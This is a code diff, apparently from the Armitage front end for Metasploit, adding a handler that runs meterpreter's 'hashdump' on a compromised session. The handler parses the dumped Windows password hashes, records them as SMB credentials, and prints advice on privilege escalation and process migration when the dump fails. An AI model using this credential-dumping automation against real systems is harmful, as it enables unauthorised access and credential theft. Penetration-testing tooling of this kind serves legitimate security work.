@@ -11,6 +11,46 @@ import javax.swing.table.*;
 import msf.*;
 import table.*;
 
+%handlers["hashdump"] = {
+	this('$host @commands $safe $last');
+
+	if ($0 eq "begin" && "*Unknown command*hashdump*" iswm $2) {
+		$host = $null;
+
+		if ($safe is $null) {
+			$safe = 1;
+			m_cmd($1, "use priv");
+			m_cmd($1, "hashdump");
+		}
+		else {
+			showError("hashdump is not available here");
+			$safe = $null;
+		}
+	}
+	else if ($0 eq "execute") {
+		$host = sessionToHost($1);
+		elog("dumped hashes on $host");
+		showError("Hashes dumped.\nUse View -> Credentials to see them.");
+	}
+	else if ($0 eq "update" && $host !is $null && $2 ismatch '(.*?):(\d+):([a-zA-Z0-9]+:[a-zA-Z0-9]+).*?') {
+		local('$user $gid $hash');
+		($user, $gid, $hash) = matched();
+
+		# strip any funky characters that will cause this call to throw an exception
+		$user = replace($user, '\P{Graph}', "");
+
+		call($client, "db.report_auth_info", %(host => $host, port => "445", sname => "smb", user => $user, pass => $hash, type => "smb_hash", active => "true"));
+	}
+	else if ($0 eq "end" && ("*Error running*" iswm $2 || "*Operation failed*" iswm $2)) {
+		showError("Hash dump failed. Ask yourself:\n\n1) Do I have system privileges?\n\nNo? Then use Access -> Escalate Privileges\n\n2) Is meterpreter running in a process owned\nby a System user?\n\nNo? Use Explore -> Show Processes and migrate\nto a process owned by a System user.");
+		$host = $null;
+	}
+	else if ($0 eq "end" && $host !is $null) {
+		# normally I'd terminate everything here, but why not just let it keep
+		# going for now.
+	}
+};
+
 sub refreshCredsTable {
 	thread(lambda({
 		[Thread yield];
